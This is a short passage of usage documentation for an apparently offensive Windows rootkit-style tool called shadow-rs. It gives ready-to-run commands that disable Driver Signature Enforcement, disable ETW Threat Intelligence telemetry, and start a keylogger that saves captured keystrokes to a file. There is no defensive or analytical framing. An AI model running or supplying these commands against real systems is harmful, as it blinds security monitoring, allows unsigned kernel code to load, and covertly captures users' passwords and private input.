## DSE (Driver Signature Enforcement)

Description: Enable or disable Driver Signature Enforcement.

```powershell
shadow.exe misc dse [OPTIONS]
```
Options:

- `--disable`: Disable DSE.
- `--enable`: Enable DSE.

Example usage:
```powershell
shadow-rs.exe misc dse --disable
```

This command disables Driver Signature Enforcement.

## ETWTI

Description: Enable or disable ETWTI.
```powershell
shadow.exe misc etwti [OPTIONS]
```
Options:
- `--disable`: Disable ETWTI.
- `--enable`: Enable ETWTI.

Example usage:
```
shadow.exe misc etwti --disable
```
This command disable ETWTI.

# Keylogger

Description: Runs a keylogger and saves the output to a specified file.
```powershell
shadow.exe misc keylogger --file <FILE>
```
Options:

- `--file`: The file path where the keylogger output will be stored.

Example usage:
```powershell
shadow.exe misc keylogger --file C:\Path\To\Output.txt
```

This command runs the keylogger and stores the output in `C:\Path\To\Output.txt`.